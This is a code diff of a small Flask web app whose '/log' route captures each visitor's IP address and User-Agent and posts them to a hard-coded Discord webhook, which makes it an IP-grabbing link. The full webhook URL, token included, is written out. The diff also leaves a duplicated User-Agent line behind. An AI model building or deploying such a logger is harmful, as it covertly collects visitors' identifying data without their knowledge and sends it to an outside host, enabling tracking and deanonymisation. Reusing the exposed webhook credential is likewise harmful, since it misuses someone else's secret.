@@ -11,14 +11,15 @@ app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1)
 
 WEBHOOK_URL = "https://discord.com/api/webhooks/1527235730055630858/VLFC3_nVPd0zdVMZLN5A9utw1oWapMWx0MLIKXYYKv551KmndGOKbITTiKO-Hc57evMT"
 
-@app.route("/log")
+@app.route('/log')
 def log_ip():
-   ip = (
-        request.headers.get("CF-Connecting-IP")
-        or request.headers.get("True-Client-IP")
-        or request.headers.get("X-Forwarded-For", "").split(",")[0].strip()
-        or request.remote_addr
-    )
+    ip = request.remote_addr
+    user_agent = request.headers.get('User-Agent')
+    data = {
+        "content": f"IP: {ip}\nUser-Agent: {user_agent}"
+    }
+    requests.post(WEBHOOK_URL, json=data)
+  
 
     user_agent = request.headers.get("User-Agent")
 
